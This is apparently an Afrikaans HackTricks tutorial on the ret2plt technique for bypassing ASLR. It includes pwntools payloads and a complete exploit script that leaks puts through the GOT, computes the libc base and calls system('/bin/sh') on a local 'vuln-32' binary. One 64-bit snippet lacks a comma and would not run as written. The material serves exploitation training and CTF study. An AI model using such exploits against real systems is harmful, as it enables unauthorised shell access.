# Ret2plt

{{#include ../../../../banners/hacktricks-training.md}}

## Basiese Inligting

Die doel van hierdie tegniek is om **'n adres van 'n funksie uit die PLT te lek** om ASLR te kan omseil. Dit is omdat as jy byvoorbeeld die adres van die funksie `puts` uit die libc lek, kan jy dan **bereken waar die basis van `libc` is** en offsets bereken om toegang te verkry tot ander funksies soos **`system`**.

Dit kan gedoen word met 'n `pwntools` payload soos ([**van hier**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Let op hoe **`puts`** (met die adres van die PLT) aangeroep word met die adres van `puts` geleë in die GOT (Global Offset Table). Dit is omdat teen die tyd dat `puts` die GOT-invoer van `puts` druk, hierdie **invoer die presiese adres van `puts` in geheue sal bevat**.

Let ook op hoe die adres van `main` in die uitbuiting gebruik word sodat wanneer `puts` sy uitvoering beëindig, die **binaire weer `main` aanroep in plaas van om te verlaat** (sodat die gelekte adres geldig sal bly).

> [!CAUTION]
> Let op hoe om dit te laat werk, die **binaire kan nie met PIE gecompileer word nie** of jy moet **'n lek gevind het om PIE te omseil** om die adres van die PLT, GOT en `main` te ken. Andersins moet jy eers PIE omseil.

Jy kan 'n [**volledige voorbeeld van hierdie omseiling hier vind**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). Dit was die finale uitbuiting van daardie voorbeeld:
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
## Ander voorbeelde & Verwysings

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64-bis, ASLR geaktiveer maar geen PIE, die eerste stap is om 'n oorgang te vul tot die byte 0x00 van die canary om dan puts aan te roep en dit te lek. Met die canary word 'n ROP gadget geskep om puts aan te roep om die adres van puts van die GOT te lek en dan 'n ROP gadget om `system('/bin/sh')` aan te roep.
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64-bits, ASLR geaktiveer, geen canary, stap oorgang in main vanaf 'n kind funksie. ROP gadget om puts aan te roep om die adres van puts van die GOT te lek en dan 'n een gadget aan te roep.

{{#include ../../../../banners/hacktricks-training.md}}
